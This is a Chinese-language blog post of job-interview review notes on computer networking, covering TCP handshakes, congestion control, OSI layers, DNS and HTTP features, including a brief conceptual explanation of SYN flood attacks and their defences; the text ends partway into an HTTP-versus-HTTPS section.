<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="计算机网络">
<meta property="og:type" content="article">
<meta property="og:title" content="计算机网络——秋招复习笔记">
<meta property="og:url" content="http://wangxuanni.top/2019/10/07/计算机网络 /index.html">
<meta property="og:site_name" content="Moonlight&#39;s blog">
<meta property="og:description" content="计算机网络">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/%E4%B8%89%E6%8C%A5.png">
<meta property="og:image" content="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/%E5%9B%9B%E6%8F%A1.png">
<meta property="og:image" content="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/TCP%E4%B8%8EUDP.png">
<meta property="og:image" content="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/%E4%B8%83%E5%B1%82.png">
<meta property="og:image" content="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/request%20%281%29.png">
<meta property="og:image" content="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/response.png">
<meta property="og:updated_time" content="2019-10-07T12:59:58.492Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="计算机网络——秋招复习笔记">
<meta name="twitter:description" content="计算机网络">
<meta name="twitter:image" content="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/%E4%B8%89%E6%8C%A5.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://wangxuanni.top/2019/10/07/计算机网络 /">





  <title>计算机网络——秋招复习笔记 | Moonlight's blog</title>
  









</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>
<a href="https://github.com/wangxuanni"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Moonlight's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.css">
<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.js"></script>

<script src="https://cdn.jsdelivr.net/npm/meting@1.2/dist/Meting.min.js"></script>




 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wangxuanni.top/2019/10/07/计算机网络 /">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Moonlight">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moonlight's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">计算机网络——秋招复习笔记</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-07T16:36:50+08:00">
                2019-10-07
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/秋招/" itemprop="url" rel="index">
                    <span itemprop="name">秋招</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/10/07/计算机网络 /#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/10/07/计算机网络 /" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  7.6k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  27min
                </span>
              
            </div>
          

          
              <div class="post-description">
                  计算机网络
              </div>
          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p><strong>计算机网络</strong></p>
<p>[TOC]</p>
<h1 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h1><h2 id="三次握手？四次挥手？"><a href="#三次握手？四次挥手？" class="headerlink" title="三次握手？四次挥手？"></a>三次握手？四次挥手？</h2><h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a><strong>三次握手</strong></h3><p>​                           <img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/%E4%B8%89%E6%8C%A5.png" alt="1564631382230">                       </p>
<ul>
<li>请求先由客户端发起。客户端发送SYN = 1和客户端序号c给服务端，同时进入SYN-SENT状态</li>
<li>服务端收到SYN后需要做出确认，于是发送ACK = 1，同时自己也发送SYN = 1、服务端序号s，还有确认号c + 1，表示想收到的下一个序号。此时服务端进入SYN-RCVD状态</li>
<li>客户端收到服务端的SYN和ACK，做出确认，发送ACK = 1，以及序号c +１，同时发送确认号s + 1，表示客户端想收到下一个序号。此时客户端和服务端进入ESTABLISHED状态，连接已建立！</li>
</ul>
<h3 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a><strong>四次挥手</strong></h3><p>   <img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/%E5%9B%9B%E6%8F%A1.png" alt="1564631391433"></p>
<ul>
<li>关闭连接也是先有客户端发起。客户端发送FIN = 1和序号c向服务端请求断开连接。此时客户端进入FIN-WAIT-1状态</li>
<li>服务端收到FIN后做出确认，发送ACK = 1和服务端序号，还有确认号c + 1表示想要收到的下一个序号。服务端此时还可以向客户端发送数据。此时服务端进入CLOSE-WAIT状态，客户端进入FIN-WAIT-2状态</li>
<li>服务端没有数据发送时，它向客户端发送FIN= 1、ACK = 1请求断开连接，同时发送服务端序号s以及确认号c + 1。此时服务端进入LAST-ACK状态</li>
<li>客户端收到后进行确认，发送ACK = 1，以及需要c + 1和确认号s + 1。此时客户端进入TIME-WAIT状态。客户端需要等待2MSL，确保服务端收到了ACK，若这期间客户端没有收到服务端的消息，便可认为服务端收到了确认，此时可以断开连接。客户端和服务端进入CLOSED状态。</li>
</ul>
<p>（回复报文都是ACK=1）</p>
<h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><h4 id="TCP为什么需要三次握手？两次不行吗？"><a href="#TCP为什么需要三次握手？两次不行吗？" class="headerlink" title="TCP为什么需要三次握手？两次不行吗？"></a>TCP为什么需要三次握手？两次不行吗？</h4><p><strong>一方面，三次握手是为了确认双方发送接受的能力，如果没有第三次握手，服务器就不知自己发送消息的能力。</strong></p>
<p><strong>另一方面，客户端只发一次请求的话，是服务器分不清是一个失效的慢抵达请求还是一个新请求。</strong>这种情况就是客户端发出了两次连接请求，但由于某种原因，使得第一次请求被滞留了。第二次请求先到达后建立连接成功，此后第一次请求终于到达，这是一个失效的请求了，服务端以为这是一个新的请求于是同意建立连接，但是此时客户端不搭理服务端，服务端一直处于等待状态，这样就浪费了资源。假设采用三次握手，由于服务端还需要等待客户端的确认，若客户端没有确认，服务端就可以认为客户端没有想要建立连接的意思，于是这次连接不会生效。</p>
<h4 id="四次挥手，为什么客户端发送确认后还需要等待2MSL"><a href="#四次挥手，为什么客户端发送确认后还需要等待2MSL" class="headerlink" title="四次挥手，为什么客户端发送确认后还需要等待2MSL?"></a>四次挥手，为什么客户端发送确认后还需要等待2MSL?</h4><p>1.避免最后一个确认报文丢失的情况</p>
<p>2.为了避免和下一次连接混淆</p>
<p>因为<strong>第四次挥手客户端发送ACK确有可能丢包</strong>。服务端没有收到，服务端就会再次发送FIN = 1，如果客户端不等待立即CLOSED，客户端就不能对服务端的FIN = 1进行确认。等待的目的就是为了能在服务端再次发送FIN = 1时候能进行确认。如果在时间等待计时器设置的世界2MSL内客户端都没有收到服务端的任何消息，便认为服务端收到了确认。此时可以结束TCP连接。</p>
<p>MSL(Maximum Segment Lifetime),最长报文段寿命。建议时间为2分钟，可根据具体情况设置的更小一点。</p>
<h4 id="为什么会出现大量的close-wait？"><a href="#为什么会出现大量的close-wait？" class="headerlink" title="为什么会出现大量的close-wait？"></a>为什么会出现大量的close-wait？</h4><p>在被动关闭连接情况下，在已经接收到FIN，但是还没有发送自己的FIN的时刻，连接处于CLOSE_WAIT状态。</p>
<p>出现大量close_wait的现象，主要原因是某种情况下对方关闭了socket链接，但是<strong>我方忙与读或者写，没有关闭连接</strong>。代码需要判断socket，一旦读到0，断开连接，read返回负，检查一下errno，如果不是AGAIN，就断开连接。</p>
<h4 id="SYN-Floold攻击-SYN洪水攻击-？"><a href="#SYN-Floold攻击-SYN洪水攻击-？" class="headerlink" title="SYN Floold攻击 (SYN洪水攻击)？"></a>SYN Floold攻击 (SYN洪水攻击)？</h4><p>在第二次握手之后，服务器维护一个未连接队列，该队列为每个客户端的SYN包（syn=j）开设一个条目，该条目存放等待第三次握手的连接。当服务器收到客户的确认包时，则可建立连接删除该条目。<br>SYN攻击属于DOS攻击（拒绝服务攻击），恶意不断地向服务器发送syn包，这些伪造的SYN包将长时间占用未连接队列，服务器还需要不断的重发直至超时<strong>正常的SYN请求被丢弃，耗费CPU和内存资源。</strong></p>
<p>一般来说，如果一个系统（或主机）负荷突然升高甚至失去响应，使用<strong>Netstat</strong> 命令能看到大量SYN_RCVD的半连接（数量&gt;500或占总连接数的10%以上），可以认定，这个系统（或主机）遭到了SYN Flood攻击。</p>
<p>有以下两种比较简单的解决办法：</p>
<ul>
<li>第一种是缩短SYN <strong>Timeout</strong>时间，例如设置为20秒以下。</li>
<li>第二种方法是设置SYN <strong>Cookie</strong>，给每一个请求连接的IP地址分配一个Cookie，如果短时间内连续受到某个IP的重复SYN报文，就认定是受到了攻击，以后从这个IP地址来的包会被一概丢弃。</li>
</ul>
<p>而缩短SYN Timeout时间仅在对方<strong>攻击频度不高</strong>的情况下生效，SYN Cookie更依赖于对方使用<strong>真实的IP地址</strong>，如果攻击者配合IP欺骗，比如利用SOCK_RAW随机改写IP报文中的源地址，cookie就毫无用武之地。</p>
<p>如果是Win2000系统，可以通过修改注册表中<em>SYN攻击时采取保护措施</em>的指数，降低SYN Flood的危害。</p>
<h4 id="client故障了怎么办？"><a href="#client故障了怎么办？" class="headerlink" title="client故障了怎么办？"></a>client故障了怎么办？</h4><p>TCP会设置一个<strong>保活计时器</strong>，每次收到客户端数据，都重新设置保活计时器，时间通常是两小时，若两小时没有收到客户数据，服务器就发送一个<strong>探测报文段</strong>，以后则每隔75秒钟发送一次，若一连发送了<strong>10个探测报文段</strong>后仍无客户的响应，服务器就认为客户端出了故障，接着关闭这个连接。</p>
<h2 id="TCP和UDP的区别？"><a href="#TCP和UDP的区别？" class="headerlink" title="TCP和UDP的区别？"></a>TCP和UDP的区别？</h2><p>​     <img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/TCP%E4%B8%8EUDP.png" alt="1564631382230"></p>
<p>简单总结一下：</p>
<p>tcp 字节流 首部20-60字节</p>
<ul>
<li><p>可靠传输 分组确认号、超时重传 +滑动窗口=连续AQS自动重传请求</p>
</li>
<li><p>面向连接 三握四挥</p>
</li>
<li><p>流控制 1.滑动窗口：以字节为单位，零窗口有持续计时器    </p>
<p>​             2.拥塞控制 慢开始 快重传 快恢复（门限值/2） 加法增长乘法减少</p>
</li>
</ul>
<p>场景：文件传输、邮件</p>
<p>udp 数据报文段 首部8字节</p>
<p>不可靠 省资源</p>
<p>场景：即时通信</p>
<h2 id="可靠传输？流量控制？拥塞控制？"><a href="#可靠传输？流量控制？拥塞控制？" class="headerlink" title="可靠传输？流量控制？拥塞控制？"></a>可靠传输？流量控制？拥塞控制？</h2><p>可靠传输是指</p>
<ul>
<li>传输的信道不产生差错（出错重发）</li>
<li>接受方来得及处理接受到的数据（快了慢点）</li>
</ul>
<p>TCP如何实现可靠传输：</p>
<ul>
<li><strong>超时重传</strong>，TCP发出一个分组后，它启动一个<strong>定时器</strong>，等接收方确认收到这个分组。如果发送方不能及时收到一个确认，将重传给接收方。<strong>序号</strong>，用于检测丢失的分组和冗余的分组。<strong>确认</strong>，告知对方已经正确收到的分组以及期望的下一个分组 <strong>校验和</strong>，校验数据在传输过程中是否发生改变，如校验有错则丢弃分组；</li>
<li><strong>滑动窗口/流量控制</strong>，进行流量控制，1.只有当最前一个发送的包的确认收到了（对于接收方来说是按序收到的数据中最高的序号），窗口才能像前移动。比如“确认号是31，表示31之前的都收到了，滑动窗口是20，接受窗口就是31~50，31是期望的序号，其实34、35也收到但不是按序到达。”       2.发送窗口的大小由对方的接收窗口和拥塞窗口的的大小决定（取两者中小的那个），当接收方来不及处理发送方的数据，能提示发送方降低发送的速率，防止包丢失。</li>
</ul>
<p>流量控制：用滑动窗口进行流量控制，针对发送双方的一方处理不过来的情况。</p>
<p>拥塞控制：防止过多的数据注入到网络当中，针对网络中的所有计算机。</p>
<ul>
<li>慢开始：先探测一下网络的拥塞程度，由小到大逐渐增加拥塞窗口的大小。指数增长，乘法减少</li>
<li>拥塞避免：转指数增大变为<strong>加法线性增大</strong>。这样就可以避免增长过快导致网路拥塞，慢慢的增加调整到网络的最佳值。</li>
<li>快重传：发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段，而不必继续等待设置的重传计时器时间到期。接受方发现M3丢失不会什么什么都不做，即便在接受到M4、M5之后也会一直发送M2的确认，当发送方收到了第四个M2的确认就会重传M3.</li>
<li>快恢复：快重传的后续处理。收到三个重复确认时，就“乘法减小”,把拥塞窗口减半，但是接下去并不执行慢开始算法（从零开始慢慢试探）；考虑到此时能连续收到3个ACK，说明网络没有拥塞，只是丢失了个别报文段，执行加法原则，有几个ACK就加几个段的字节数。</li>
</ul>
<p>参考：<a href="http://www.voidcn.com/article/p-vrdkquop-ms.html" target="_blank" rel="noopener">网络基本功：TCP拥塞控制机制</a></p>
<h1 id="网络协议"><a href="#网络协议" class="headerlink" title="网络协议"></a>网络协议</h1><h2 id="网络的7层模型了解吗？"><a href="#网络的7层模型了解吗？" class="headerlink" title="网络的7层模型了解吗？"></a>网络的7层模型了解吗？</h2><p><img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/%E4%B8%83%E5%B1%82.png" alt="1564631406937"></p>
<p>即OSI参考模型。</p>
<ol>
<li>应用 http、ftp、web、qq</li>
<li>表示 编码、压缩、加密解密</li>
<li>会话 发起会话</li>
<li>传输 tcp udp</li>
<li>网络 路由选择</li>
<li>数据链路 mac的封装和解封</li>
<li>物理 比特 物理设备标准光纤接口、网线接口</li>
</ol>
<p>还有一种TCP/IP五层模型，就是把应用层、表示层、会话层统一归到应用层。借用一张图。</p>
<h2 id="有了传输层为什么还需要网络层？"><a href="#有了传输层为什么还需要网络层？" class="headerlink" title="有了传输层为什么还需要网络层？"></a>有了传输层为什么还需要网络层？</h2><p>网络层是针对主机与主机之间的服务。而传输层针对的是不同主机进程之间的通信。传输层协议将应用进程的消息传送到网络层，但是它并不涉及消息是怎么在网络层之间传送（这部分是由网络层的路由选择完成的）。网络层真正负责将数据包从源IP地址转发到目标IP地址，而传输层负责将数据包再递交给主机中对应端口的进程。</p>
<p>打个比方。房子A中的人要向房子B中的人写信。房子中都有专门负责将主人写好的信投递到邮箱，以及从邮箱接收信件后交到主人手中的管家。那么：</p>
<p> 房子 = 主机</p>
<p>信的内容 = 应用程序消息</p>
<p>信封 = 数据包，带有源端口、目的端口、源IP地址、目的IP地址。</p>
<p>邮递员 = 网络层协议，知道信从哪个房子开始发的，以及最后要送到哪个具体的房子。</p>
<p>管家 = 传输层协议，负责将信投入到信箱中、以及从信箱中接收信件。知道这封信是谁写的以及要送到谁手上（具体端口号）</p>
<h2 id="主机A向主机B发送数据，在这个过程中，传输层和网络层做了什么？"><a href="#主机A向主机B发送数据，在这个过程中，传输层和网络层做了什么？" class="headerlink" title="主机A向主机B发送数据，在这个过程中，传输层和网络层做了什么？"></a>主机A向主机B发送数据，在这个过程中，传输层和网络层做了什么？</h2><p>当TCP连接建立之后，应用程序就可使用该连接进行数据收发。应用程序将数据提交给TCP，TCP将数据放入自己的缓存，数据会被当做字节流并进行分段，然后加上TCP头部并提交给网络层。再加上IP头后被网络层提交给到目的主机，目的主机的IP层会将分组提交给TCP，TCP根据报文段的头部信息找到相应的socket，并将报文段提交给该socket，socket是和应用关联的，于是数据就提交给了应用。</p>
<p>对于UDP会简单些，UDP面向报文段。传输层加上UDP头部递交给网络层，再加上IP头部经路由转发到目的主机，目的主机将分组提交给UDP，UDP根据头部信息找到相应的socket，并将报文段提交给该socket，socket是和应用关联的，于是数据就提交给了应用。</p>
<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="浏览器发起HTTP请求后发生了什么？"><a href="#浏览器发起HTTP请求后发生了什么？" class="headerlink" title="浏览器发起HTTP请求后发生了什么？"></a>浏览器发起HTTP请求后发生了什么？</h2><ul>
<li>当在浏览器输入网址<a href="http://www.baidu.com并敲下回车后：" target="_blank" rel="noopener">www.baidu.com并敲下回车后：</a></li>
<li>DNS域名解析，将域名<a href="http://www.baidu.com解析成IP地址" target="_blank" rel="noopener">www.baidu.com解析成IP地址</a></li>
<li>发起TCP三次握手，建立TCP连接。浏览器以一个随机端口（1024~65535）向服务器的80端口发起TCP连接。</li>
<li>在TCP连接上发起HTTP请求。</li>
<li>服务端响应HTTP请求，将html代码返回给浏览器。</li>
<li>浏览器解析html代码，请求html中的资源</li>
<li>浏览器对页面进行渲染呈现给用户</li>
</ul>
<h2 id="DNS域名解析的请求过程？"><a href="#DNS域名解析的请求过程？" class="headerlink" title="DNS域名解析的请求过程？"></a>DNS域名解析的请求过程？</h2><ul>
<li>先在浏览器自身的DNS缓存中搜索</li>
<li>如上述步骤未找到，浏览器搜索操作系统本身的DNS缓存</li>
<li>如果在系统DNS缓存中未找到，则尝试读取hosts文件，寻找有没有该域名对应的IP</li>
<li>果hosts文件中没找到，浏览器会向本地配置的首选DNS服务器发起域名解析请求 。运营商的DNS服务器首先查找自身的缓存，若找到对应的条目且没有过期，则解析成功。如果没有找到，运营商的DNS代我们的浏览器，以根域名-&gt;顶级域名-&gt;二级域名-&gt;三级域名这样的顺序发起迭代DNS解析请求。</li>
</ul>
<h2 id="请求和响应的报文结构（格式）？"><a href="#请求和响应的报文结构（格式）？" class="headerlink" title="请求和响应的报文结构（格式）？"></a>请求和响应的报文结构（格式）？</h2><p>HTTP请求的报文格式：</p>
<p><img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/request%20%281%29.png" alt="1564631437001"></p>
<p>HTTP响应的报文格式：</p>
<p><img src="https://wangxuanni.oss-cn-hongkong.aliyuncs.com/response.png" alt="1564631450295"></p>
<h2 id="GET与POST的对比，或者说区别？"><a href="#GET与POST的对比，或者说区别？" class="headerlink" title="GET与POST的对比，或者说区别？"></a>GET与POST的对比，或者说区别？</h2><table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left">GET</th>
<th style="text-align:left">POST</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">后退按钮/刷新</td>
<td style="text-align:left">无害</td>
<td style="text-align:left">数据会被重新提交（浏览器应该告知用户数据会被重新提交）。</td>
</tr>
<tr>
<td style="text-align:left">书签</td>
<td style="text-align:left">可收藏为书签</td>
<td style="text-align:left">不可收藏为书签</td>
</tr>
<tr>
<td style="text-align:left">编码类型</td>
<td style="text-align:left">application/x-www-form-urlencoded</td>
<td style="text-align:left">application/x-www-form-urlencoded or multipart/form-data。为二进制数据使用多重编码。</td>
</tr>
<tr>
<td style="text-align:left">历史</td>
<td style="text-align:left">参数保留在浏览器历史中。</td>
<td style="text-align:left">参数不会保存在浏览器历史中。</td>
</tr>
<tr>
<td style="text-align:left">对数据长度的限制</td>
<td style="text-align:left">是的。当发送数据时，GET 方法向 URL 添加数据；URL 的长度是受限制的（URL 的最大长度是 2048 个字符）。</td>
<td style="text-align:left">无限制。</td>
</tr>
<tr>
<td style="text-align:left">对数据类型的限制</td>
<td style="text-align:left">只允许 ASCII 字符。</td>
<td style="text-align:left">没有限制。也允许二进制数据。</td>
</tr>
<tr>
<td style="text-align:left">安全性</td>
<td style="text-align:left">与 POST 相比，GET 的安全性较差，因为所发送的数据是 URL 的一部分。  在发送密码或其他敏感信息时绝不要使用 GET ！</td>
<td style="text-align:left">POST 比 GET 更安全，因为参数不会被保存在浏览器历史或 web 服务器日志中。</td>
</tr>
<tr>
<td style="text-align:left">可见性</td>
<td style="text-align:left">数据在 URL 中对所有人都是可见的。</td>
<td style="text-align:left">数据不会显示在 URL 中。</td>
</tr>
</tbody>
</table>
<ol>
<li>幂等性</li>
<li>安全：显示在URL中/历史记录/书签</li>
<li>数据长度</li>
<li>二进制</li>
</ol>
<h2 id="常见的状态码？"><a href="#常见的状态码？" class="headerlink" title="常见的状态码？"></a>常见的状态码？</h2><ul>
<li>1XX：信息性状态码，表示接收的请求正在处理</li>
<li>2XX：成功状态码，表示请求正常处理完毕</li>
<li>3XX：重定向状态码，表示需要进行附加操作以完成请求</li>
<li>4XX：客户端错误状态码，表示服务器无法处理请求</li>
<li>5XX：服务端错误状态码，表示服务器处理请求出错</li>
</ul>
<p>常见的状态码有：</p>
<ul>
<li>200 OK，请求被正常处理</li>
<li>301 Move Permanently，永久性重定向</li>
<li>302 Found，临时性重定向</li>
<li>400 Bad Request，请求报文中存在语法错误</li>
<li>403 Forbidden，对请求资源的访问被服务器拒绝</li>
<li>404 Not Found，在服务器上不能找到请求的资源</li>
<li>500 Internal Server Error，服务器内部错误</li>
</ul>
<h2 id="HTTP-1-0和HTTP-1-1的主要区别是什么？"><a href="#HTTP-1-0和HTTP-1-1的主要区别是什么？" class="headerlink" title="HTTP 1.0和HTTP 1.1的主要区别是什么？"></a>HTTP 1.0和HTTP 1.1的主要区别是什么？</h2><p>HTTP1.0最早在网页中使用是在1996年，那个时候只是使用一些较为简单的网页上和网络请求上，而HTTP1.1则在1999年才开始广泛应用于现在的各大浏览器网络请求中，同时HTTP1.1也是当前使用最为广泛的HTTP协议。 主要区别主要体现在：</p>
<p><strong>长连接</strong> :详见下一个问题。</p>
<p><strong>缓存处理</strong> :在HTTP1.0中主要使用header里的If-Modified-Since,Expires来做为缓存判断的标准，HTTP1.1则引入了更多的缓存控制策略例如Entity tag，If-Unmodified-Since, If-Match, If-None-Match等更多可供选择的缓存头来控制缓存策略。</p>
<p>If-Modified-Since:Thu Apr 2016 00:00:00.意思如果在这个时间点之后有更新，则处理请求，否则，返回304not Modified状态码</p>
<p>Expires这份缓存你可以用到什么时候</p>
<p>1.0If-Unmodified-Since/If-Match/ If-None-Match——&gt;如果在这个时间点之后有更新，则处理请求/如果有与请求头请求的资源，就处理请求/请求头：put /sample.html if-None-match——”服务器没有Sample.html,所有可以处理你的请求”</p>
<p><strong>节约带宽资源</strong>:HTTP1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1则在请求头引入了range头域，它允许只请求资源的某个部分，即返回码是206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。</p>
<p>Range, 允许只请求资源的某个部分. If-Range另外如果资源与请求字段的ETag相同，则返回一定范围的资源，否则返回全部。如果用If- Match，请求不符合，客户端还会再发送一个请求，多了两倍的功夫。</p>
<p><strong>错误状态响应码</strong> :在HTTP1.1中新增了24个错误状态响应码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</p>
<h2 id="Http长连接是什么？"><a href="#Http长连接是什么？" class="headerlink" title="Http长连接是什么？"></a>Http长连接是什么？</h2><p><strong>HTTP/1.0默认短连接</strong>，每次请求都要重新建立一次连接。HTTP 是基于TCP/IP协议的,每一次建立或者断开连接都需要三次握手四次挥手的开销，开销会比较大。</p>
<p><strong>HTTP 1.1默认使用长连接</strong> ,默认开启Connection： keep-alive。 一个tcp连接允许的是6个并发HTTP连接。</p>
<p><strong>参数：Keep-Alive: timeout=60</strong>最大等待时间，如果配置为0，则表示关掉keepalive，</p>
<p><strong>场景：</strong>在客户端需要多次访问同一个server时，比如图片服务器，打开长连接可以大量减少time-wait的数量。</p>
<p>HTTP/1.1的持续连接有非流水线方式和流水线方式 。流水线已经被更好的算法给代替，如 <code>multiplexing</code>，已经用在 HTTP/2。。</p>
<p><strong>HTTP2 信道复用</strong>，在 TCP 连接上可以<strong>并发</strong>的发送 HTTP 请求，意味着链接网站是只需要一个 TCP 连接。<a href="https://link.zhihu.com/?target=http%3A//google.com" target="_blank" rel="noopener">http://google.com</a>的页面都是用的 HTTP2。http连接的connection id 都是一个，注意，同域 id 才相同，不同域需要创建 tcp 连接，这样降低了开销，速度有质的提升。谷歌使用的是2.0</p>
<h2 id="HTTP和-HTTPS的区别？"><a href="#HTTP和-HTTPS的区别？" class="headerlink" title="HTTP和 HTTPS的区别？"></a>HTTP和 HTTPS的区别？</h2><p><strong>端口</strong> ：HTTP的URL由“http://”起始且默认使用端口80，而HTTPS的URL由“https://”起始且默认使用端口443。</p>
